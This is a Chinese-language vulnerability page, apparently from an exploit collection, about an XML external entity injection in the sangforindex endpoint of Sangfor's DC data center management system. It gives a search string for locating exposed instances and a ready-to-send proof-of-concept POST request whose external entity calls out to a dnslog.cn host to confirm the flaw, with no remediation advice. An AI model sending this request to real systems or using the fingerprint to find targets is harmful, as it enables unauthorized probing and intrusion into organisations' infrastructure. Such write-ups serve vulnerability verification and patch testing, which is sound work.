# 深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞

## 漏洞描述

深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入

## 漏洞影响

<a-checkbox checked>深信服 DC数据中心管理系统 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>"SANGFOR 数据中心"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1692061412640-89b0f89d-f4eb-4cec-8df7-42a0c36fe233.png)

验证POC

```plain
POST /src/sangforindex HTTP/1.1
Host: 
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE root [
    <!ENTITY rootas SYSTEM "http://xgsg1k.dnslog.cn">
]>
<xxx>
&rootas;
</xxx>
```

![img](../../../.vuepress/public/img/1692061553187-836f8383-a0e4-419d-b6eb-a001f62a92d5.png)